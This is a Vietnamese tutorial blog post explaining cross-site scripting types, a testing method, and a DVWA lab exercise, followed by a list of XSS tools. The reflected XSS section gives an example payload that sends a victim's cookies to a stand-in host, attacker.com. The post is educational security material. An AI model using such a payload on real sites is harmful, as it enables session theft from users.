![](https://images.viblo.asia/0a88abeb-3760-4195-b903-594706b2461b.png)

Hình ảnh trên minh họa cho lỗ hổng XSS

Lỗ hổng Cross-Site Scripting là lỗ hổng phổ biến nhất được tìm thấy trên ứng dụng web. Lỗ hổng này được đánh giá là nguy hiểm và đến bây giờ vẫn còn rất phổ biến. Theo thống kê của OWASP thì lỗ hổng này đứng thứ 3 trong [top 10 OWASP năm 2013](https://www.owasp.org/index.php/Top_10_2013-Top_10) và đứng thứ 7 trong [top 10 OWASP năm 2017](https://www.owasp.org/index.php/Top_10-2017_Top_10).
 
Trong bài này, chúng ta sẽ tìm hiểu XSS là gì? Cũng như cách phát hiện và cách khai thác.
# 1. XSS là gì?
XSS là viết tắt của Cross-Site Scripting (có tên gọi như vậy là vì người ta không muốn nhầm lẫn với CSS - Cascading Style Sheets trong HTML) là một lỗ hổng web. Nó cho phép người tấn công chèn các mã kịch bản (thường là JavaScript), html,... lên website. Lỗ hổng này sẽ tấn công bên phía người dùng (Client) thay vì tấn công lên server.
# 2. Phân loại
*[Theo wikipedia thì XSS được chia thành 5 loại](https://en.wikipedia.org/wiki/Cross-site_scripting#Types)*.
*  Non-persistent (reflected)
*  Persistent (or stored)
*   Server-side versus DOM-based vulnerabilities
*   Self-XSS
*   Mutated XSS (mXSS)

Nhưng thường thì XSS được biết đến 3 loại chính: reflected XSS, stored XSS, DOM-based XSS.
Và trong bài sẽ chỉ đề cập đến 3 loại này.
## 1. Reflected XSS
Reflected XSS xảy ra khi người tấn công chèn các mã độc hại vào một request HTTP tới server, server sẽ trả lại những gì đã gửi lên. Các đoạn mã này không được ứng dụng lưu lại, nó chỉ có ảnh hưởng tới người gửi request có chứa mã độc này. Thường mã này chứa trong URI, khi người dùng click vào sẽ dính chưởng của người tấn công. Khi rời khỏi URI chứa mã độc thì người dùng không bị ảnh hưởng bởi nó nữa.

Và đây cũng là loại lỗ phổ biến nhất trong thực tế. Ngoài cái tên reflected XSS thì nó còn được biết đến với cái tên non-persistent XSS hay first-order hay loại 1 XSS.

Ví dụ:
```js
https://example.com/news?q=<script>document.location='https://attacker.com/log.php?c=' + encodeURIComponent(document.cookie)</script>
```
## 2. Stored XSS
Ngược lại với reflected XSS, Stored XSS sẽ được ứng dụng lưu lại. Khi kẻ tấn công gửi các mã độc hại lên server mà server không lọc trước khi lưu trữ thì server sẽ là nơi lưu trữ kho mã độc khổng lồ để tấn công người dùng. Bất cứ khi nào người dùng vào trang có chứa mã độc thì nó lập tức phát huy công dụng. Các đoạn mã này thường nằm trong các bình luận, đoạn tin nhắn, thông báo,...

Ngoài cái tên stored XSS nó còn được biết đến cái tên persistent XSS hay second-order XSS.
## 3. DOM-based XSS
DOM-based XSS (hay còn gọi là DOM XSS) xảy ra khi ứng dụng chứa các đoạn mã JavaScript xử lý dữ liệu một cách không an toàn.

Ví dụ: người dùng tìm kiếm với từ khóa **xss**, sau khi kết quả trả về thì một hàm nào đó trong JS (JavaScript) sẽ dùng kết quả này để xử lý và hiển thị dữ liệu ra cho người tùy vào việc người dùng nhập vào. Khi đó người tấn công sẽ đưa các mã độc vào để thực hiện tấn công người dùng.
# 3. Cách kiểm tra
Ở trên là một mớ lý thuyết lùng nhùng. Và tiếp theo đây sẽ là mớ lý thuyết nữa để ta có thể tiến hành khai thác lỗi XSS. Về cơ bản, để kiểm tra một trang web có dính lỗi XSS hay không sẽ gồm 3 bước.
## Bước 1. Tìm kiếm các điểm nhập khả nghi
Đầu tiên ta sẽ tìm các điểm nhập (hay những nơi cho phép ta nhập dữ liệu vào để xử lý) khả nghi. Nó có thể là ô tìm kiếm, ô bình luận, cookie, input form,...
Sau khi xác định sơ bộ các nơi khả nghi rồi ta tiến hành đến bước thứ 2.
## Bước 2. Phân tích các điểm nhập
Bước này sẽ là bước tiếp theo sau bước 1. Tiến hành phân tích mã nguồn HTML và JS để có tạo dữ liệu có thể khiến ứng dụng sinh ra lỗi. Dữ liệu tạo ra cần phù hợp với website đang thử nghiệm, nếu không sử dụng các JS thì cần đầu vào như nào thì có thể phát hiện ra lỗi. Nếu dùng Framework thì cần đầu vào như nào?

Bình thường thì ứng dụng web sẽ mã hóa những ký tự bất thường có thể sinh lỗi, khi đó ta cần tìm cách vượt qua. Nếu không thể vượt qua thì thôi.
## Bước 3. Phân tích kết quả trả về và xác định lỗi
Với mỗi dữ liệu nhập vào từ bước trên ta sẽ tiến hành phân tích kết quả trả về. Kiểm tra xem các ký tự đặc biệt, hay những ký tự phục vụ cho mục đích tạo mã độc có bị encode hay biến mất không. Nếu các ký tự cần thiết vẫn xuất hiện bình thường thì đã ứng dụng có tồn tại lỗ hổng. Nếu không thì quay lại bước 2 đến khi hết cách thì thôi.
# 4. Thực hành
Sau hai phần dài toàn lý thuyết suông thì phần này sẽ thực hành để cho não nghỉ ngơi.
Phần thực hành này sẽ được thực hiện thông qua [DVWA](www.dvwa.co.uk). Có nhiều môi trường thử nghiệm khác như: [bWapp](http://www.itsecgames.com/), [WebGoat](https://github.com/WebGoat/WebGoat/releases),... Chọn đai một cái để thực hành thôi. Tất cả chúng đều có thể tải [docker](https://www.docker.com/) về để sử dụng cho đỡ mất công. 

**[Danh sách docker phục vụ việc thực hành](https://termilus.com/blog/2016/11/07/penetration-testing-exercises-using-docker/)**
 
Đầu tiên ta cần tìm nơi để điền thông tin. Vì đây là lab nên không cần tìm mà nó hiện ngay trước mắt.
![](https://images.viblo.asia/91a26ed8-b097-4352-ad6d-a8c26b9c4ef4.png)

Tiếp theo ta sẽ điền vào một đầu vào chứa ký tự đặc biệt để có thể gây ra lỗi: `<XXX>`. Để xem ứng dụng web sẽ đối xử với dữ liệu ta nhập vào như nào!
![](https://images.viblo.asia/b6e48ca9-32c8-4817-b17a-77412c1cbe24.png)
 
Ở đây, ta thấy không hiển thị phần dữ liệu ta nhập vào. Vậy, thử xem trong source code xem thế nào, nhấn crt+u để xem source code.
![](https://images.viblo.asia/421fdc41-dc54-4c59-9129-4458fa2d6831.png)
 
Vậy là trong source code có dữ liệu nhưng mà không hiển thị ra. Dựa vào dấu hiệu lỗi trên, ta sửa lại playload (đoạn mã khai thác). Ta chọn đoạn mã `<script>alert('XSS')</script>` để thử.
![](https://images.viblo.asia/bf687658-e766-470e-8e97-a8b32bfc4762.png)

Sau khi nhập vào: `<script>alert('XSS')</script>` thì ta đã thực được kịch bản mong muốn là hiển thị lên dòng chữ **XSS**. Đến đây thì công việc tìm kiếm và khai thác đã hoàn tất :).
 
Vậy là ta đã đi qua lý thuyết cũng như thực hành rất cơ bản để hiểu XSS là gì và tiến hành khai thác lỗi XSS cơ bản.
Phần cuối cùng là một vài tool giúp ta tìm lỗi XSS và khai thác tự động.
 
# 5. Tool And References
## 5.1 Tool
* [Burp Suite](https://portswigger.net/burp) sử dụng làm proxy để bắt các request qua lại giữ client và server.
* [Xenotix](https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework#owasp-xenotix-xss-exploit-framework) công cụ quét lỗ hổng XSS tự động.
* [XSStrike](https://github.com/s0md3v/XSStrike) dùng để quét tự động, chỉ quét lỗ reflected XSS.
* [BeEF](https://beefproject.com/) sử dụng để khai thác lỗi XSS.
* [XSS Proxy](http://xss-proxy.sourceforge.net/) giống BeEF.
## 5.2 References
* [XSS in Wiki](https://en.wikipedia.org/wiki/Cross-site_scripting)
* [XSS in Portswigger](https://portswigger.net/web-security/cross-site-scripting)
* [XSS in CloudFlare](https://www.cloudflare.com/learning/security/threats/cross-site-scripting/)